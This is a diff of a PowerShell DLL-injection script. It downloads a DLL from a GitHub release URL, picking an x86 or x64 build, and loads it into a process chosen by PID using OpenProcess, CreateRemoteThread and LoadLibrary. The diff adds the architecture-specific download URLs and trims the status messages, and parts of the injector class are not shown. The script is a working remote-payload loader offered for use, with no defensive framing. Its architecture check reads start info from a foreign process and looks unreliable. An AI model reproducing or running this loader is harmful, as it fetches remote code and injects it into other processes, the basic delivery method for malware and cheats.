@@ -1,12 +1,18 @@
-$dllUrl = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1.dll"
-$webClient = New-Object System.Net.WebClient
-$dllBytes = $webClient.DownloadData($dllUrl)
+$dllUrl_x86 = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1_x86.dll"
+$dllUrl_x64 = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1_x64.dll"
 
 Write-Host "Enter PID : " -NoNewline
 $targetPid = [int](Read-Host)
 
-$processExists = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
-if (-not $processExists) { exit }
+$proc = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
+if (-not $proc) { exit }
+
+# ตรวจสอบ architecture
+$is64Bit = [Environment]::Is64BitOperatingSystem -and $proc.StartInfo.EnvironmentVariables["PROCESSOR_ARCHITECTURE"] -eq "AMD64"
+if ($is64Bit) { $dllUrl = $dllUrl_x64 } else { $dllUrl = $dllUrl_x86 }
+
+$wc = New-Object System.Net.WebClient
+$dllBytes = $wc.DownloadData($dllUrl)
 
 if (-not ([System.Management.Automation.PSTypeName]'Injector').Type) {
     Add-Type -TypeDefinition @"
@@ -51,14 +57,10 @@ $threadHandle = [Injector]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $remo
 if ($threadHandle -eq 0) {
     "CreateRemoteThread failed"
 } else {
-    $waitResult = [Injector]::WaitForSingleObject($threadHandle, 5000)
+    [Injector]::WaitForSingleObject($threadHandle, 5000)
     $exitCode = 0
     [Injector]::GetExitCodeThread($threadHandle, [ref]$exitCode)
-    if ($exitCode -eq 0) {
-        "LoadLibrary FAILED - DLL may be invalid or wrong architecture"
-    } else {
-        "LoadLibrary SUCCESS - DLL loaded at: 0x$($exitCode.ToString('X'))"
-    }
+    if ($exitCode -eq 0) { "LoadLibrary FAILED" } else { "LoadLibrary SUCCESS" }
     [Injector]::CloseHandle($threadHandle)
 }
 [Injector]::CloseHandle($hProcess)
